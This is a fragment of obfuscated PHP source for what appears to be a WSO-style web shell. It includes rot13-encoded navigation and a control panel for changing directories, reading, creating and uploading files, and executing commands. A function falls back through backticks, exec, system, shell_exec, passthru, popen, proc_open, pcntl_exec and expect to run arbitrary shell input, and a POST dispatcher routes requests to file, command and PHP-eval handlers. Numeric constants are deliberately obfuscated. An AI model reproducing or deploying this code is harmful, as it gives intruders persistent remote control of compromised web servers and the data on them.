			"',\x27',\047','')\042>[ root ]</a> <a href=# onclick=\042g('fm','" .
			str_rot13($_y) .
			"\x27,'','','')\x22>[ home ]</a></span><span id=\x22cwd\x22 style=\042display: none;\042 class=\x22wfw\x22><input size=" .
			(strlen($_zb) +
				(int) round(
					7.3333333333333 + 7.3333333333333 + 7.3333333333333
				)) .
			" type=text value=\x22" .
			$_zb .
			"\x22></span> <a href=# onclick=\x22show();\x22><font color=#fff id=\042bat\x22>Text</font></a><br>" .
			$_xc .
			"</td>" .
			"<td width=1 align=right><nobr><select onchange=\042g(null,null," .
			(!empty($_POST["p"]) ? "'" . $_POST["p"] . "'" : "null") .
			",null,null,this.value)\x22><optgroup label=\x22Page charset\042>" .
			$_h .
			"</optgroup></select><br><span>Server IP:</span><br>" .
			$_ja .
			"<br><span>Client IP:</span><br>" .
			$_SERVER["REMOTE_ADDR"] .
			"</nobr></td></tr></table>" .
			"<table style=\x22border-top:2px solid #333;\x22 cellpadding=3 cellspacing=0 width=100%><tr>" .
			$_su .
			"</tr></table><div style=\042margin:5\x22>";
	}
	function _pbhh()
	{
		$_zb = $this->_zb;
		$_rho = @is_writable($_zb)
			? " <font color=\047green\047>(Writeable)</font>"
			: " <font color=red>(Not writable)</font>";
		echo "</div><table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;\047><tr><td><form onsubmit='g(null,rot13(this.c.value),\042\042);return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" .
			_lqyw($_zb) .
			"'><input type=submit value='>>'></form></td><td><form onsubmit=\042g('ft',null,rot13(this.f.value));return false;\042><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value=\047>>'></form></td></tr><tr><td><form onsubmit=\x22g('fm',null,'md',rot13(this.d.value));return false;\x22><span>Make dir:</span>" .
			$_rho .
			"<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td><td><form onsubmit=\x22g('ft',null,rot13(this.f.value),'mkfile');return false;\x22><span>Make file:</span>" .
			$_rho .
			"<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td></tr><tr><td><form onsubmit=\042g('ce',null,utoa(this.c.value));return false;\x22><span>Execute:</span><br><input class='toolsInp' type=text name=c value=\047'><input type=submit value=\047>>'></form></td><td><form method='post' ENCTYPE='multipart/form-data\047><input type=hidden name=a value=\x27fm'><input type=hidden name=c value='" .
			str_rot13($_zb) .
			"'><input type=hidden name=p value=\047uf'><input type=hidden name=ch value='" .
			(isset($_POST["ch"]) ? $_POST["ch"] : "") .
			"'><span>Upload file:</span>" .
			$_rho .
			"<br><input class='toolsInp' type=file name=f><input type=submit value='>>\047></form><br  ></td></tr></table></div></body></html>";
	}
}
function _lqyw($_lbm)
{
	return str_replace(
		["&", "\042", "<", ">"],
		["&amp;", "&quot;", "&lt;", "&gt;"],
		$_lbm
	);
}
function _bjab($_enx)
{
	@ob_start();
	if ($_lop = @`echo 1`) {
		echo @`{$_enx}`;
	} elseif (@function_exists("exec")) {
		@exec($_enx, $_lop);
		echo @join(" ", $_lop);
	} elseif (@function_exists("system")) {
		@system($_enx);
	} elseif (@function_exists("shell_exec")) {
		echo @shell_exec($_enx);
	} elseif (@function_exists("passthru")) {
		@passthru($_enx);
	} elseif (@is_resource($_egw = @popen($_enx, "r"))) {
		while (!feof($_egw)) {
			echo @fread($_egw, 01600 + 01545 + -01345);
		}
		@pclose($_egw);
	} elseif (
		@is_resource(
			$_egw = @proc_open(
				$_enx,
				[["pipe", "r"], ["pipe", "w"], ["pipe", "a"]],
				$_eum
			)
		)
	) {
		echo @stream_get_contents($_eum[(int) round(0.5 + 0.5)]);
		@proc_close($_egw);
	} elseif (@function_exists("pcntl_exec")) {
		@pcntl_exec("/bin/sh", ["-c", $_enx]);
	} elseif (
		@function_exists("expect_popen") &&
		is_resource($_egw = @expect_popen($_enx))
	) {
		while (!feof($_egw)) {
			echo @fread($_egw, 02017 + -017);
		}
		@fclose($_egw);
	} elseif (@is_resource($_egw = @fopen("expect://" . $_enx, "r"))) {
		while (!feof($_egw)) {
			echo @fread($_egw, 02160 - 02607 + 02427);
		}
		@fclose($_egw);
	}
	$_vcp = @ob_get_clean();
	return $_vcp;
}
function _xkmo($_tcg, $_zo = "torrwn", $_xt = null)
{
	if (is_int($_tcg)) {
		$_tcg = @sprintf("%u", $_tcg);
	}
	if ($_tcg >= 010000000300 + -0300) {
		return @sprintf(
			"%1.2f",
			$_tcg /
				(int) round(357913941.33333 + 357913941.33333 + 357913941.33333)
		) . " GB";
	} elseif (
		$_tcg >=
		(int) round(349525.33333333 + 349525.33333333 + 349525.33333333)
	) {
		return @sprintf("%1.2f", $_tcg / (03776733 - 04001232 + 04002277)) .
			" MB";
	} elseif ($_tcg >= (int) round(512 + 512)) {
		return @sprintf(
			"%1.2f",
			$_tcg /
				(int) round(341.33333333333 + 341.33333333333 + 341.33333333333)
		) . " KB";
	} else {
		return $_tcg . " B";
	}
}
function _ip($_eum)
{
	if (
		($_eum & (int) round(16384 + 16384 + 16384)) ==
		(int) round(16384 + 16384 + 16384)
	) {
		$_ox = "s";
	} elseif (
		($_eum &
			(int) round(13653.333333333 + 13653.333333333 + 13653.333333333)) ==
		0117764 - 0117770 - -0120004
	) {
		$_ox = "l";
	} elseif (
		($_eum & (0100154 + -0154)) ==
		(int) round(10922.666666667 + 10922.666666667 + 10922.666666667)
	) {
		$_ox = "-";
	} elseif (($_eum & (057725 + 057461 - 057406)) == 056373 - -01405) {
		$_ox = "b";
	} elseif (
		($_eum &
			(int) round(5461.3333333333 + 5461.3333333333 + 5461.3333333333)) ==
		(int) round(8192 + 8192)
	) {
		$_ox = "d";
	} elseif (
		($_eum &
			(int) round(2730.6666666667 + 2730.6666666667 + 2730.6666666667)) ==
		020037 + 017742 - 020001
	) {
		$_ox = "c";
	} elseif (($_eum & (07274 - -0504)) == 07557 + 010365 + -010144) {
		$_ox = "p";
	} else {
		$_ox = "u";
	}
	$_ox .= $_eum & (-0557 + 01157) ? "r" : "-";
	$_ox .= $_eum & (int) round(64 + 64) ? "w" : "-";
	$_ox .=
		$_eum & (-0213 + -01257 + 01572)
			? ($_eum & (02163 - 05507 - -07324)
				? "s"
				: "x")
			: ($_eum &
			(int) round(682.66666666667 + 682.66666666667 + 682.66666666667)
				? "S"
				: "-");
	$_ox .= $_eum & (-0560 + 01316 - 0476) ? "r" : "-";
	$_ox .= $_eum & (-012 - 03 + 035) ? "w" : "-";
	$_ox .=
		$_eum & (-0105 + 0115)
			? ($_eum & (02301 - 01270 + 0767)
				? "s"
				: "x")
			: ($_eum & (02104 + -0104)
				? "S"
				: "-");
	$_ox .= $_eum & (int) round(2 + 2) ? "r" : "-";
	$_ox .=
		$_eum &
		(int) round(0.66666666666667 + 0.66666666666667 + 0.66666666666667)
			? "w"
			: "-";
	$_ox .=
		$_eum & (03 - -033 + -035)
			? ($_eum & (-0147 + 01147)
				? "t"
				: "x")
			: ($_eum & (int) round(256 + 256)
				? "T"
				: "-");
	return $_ox;
}
function _bkcv($_egw)
{
	if (!@is_readable($_egw)) {
		return "<font color=#FF0000>" .
			_ip(fileperms($_egw)) .
			"</font>";
	} elseif (!@is_writable($_egw)) {
		return "<font color=white>" . _ip(fileperms($_egw)) . "</font>";
	} else {
		return "<font color=#25ff00>" .
			_ip(fileperms($_egw)) .
			"</font>";
	}
}
function _zhpf($_t)
{
	if (@function_exists("scandir")) {
		return @scandir($_t);
	} else {
		if ($_b = @opendir($_t)) {
			while (false !== ($_do = @readdir($_b))) {
				$_une[] = $_do;
			}
			@closedir($_b);
		}
		return $_une;
	}
}
function _ev($_eum)
{
	$_atj = _bjab("which " . $_eum);
	if (!empty($_atj)) {
		return $_atj;
	}
	return false;
}
$_ug = new _uc();
$_ug->_gz();
$_ug->_ry();
if (isset($_POST["a"])) {
	switch ($_POST["a"]) {
		case "fm":
			$_ug->_ds();
			$_ug->_eg();
			$_ug->_pbhh();
			break;
		case "ce":
			@session_start();
			$_ug->_ds();
			$_ug->_vi();
			$_ug->_pbhh();
			break;
		case "Php":
		case "ph":
			$_ug->_ds();
			$_ug->_ksdl();
			$_ug->_pbhh();
			break;
		case "phi":
		case "pi":
			$_ug->_ds();
			$_ug->_jaq();
			$_ug->_pbhh();
			break;
		case "ft":
			if (
				isset($_POST["x"]) &&
				($_POST["x"] == "download" || $_POST["x"] == "dl")
			) {
				$_ug->_ng();
			} else {
				$_ug->_ds();
				$_ug->_ng();
				$_ug->_pbhh();
			}
			break;
		default:
			$_ug->_ds();
			$_ug->_eg();
			$_ug->_pbhh();
			break;
	}
} elseif (!isset($_POST["a"])) {
	$_ug->_ds();
	$_ug->_eg();
	$_ug->_pbhh();
}
die();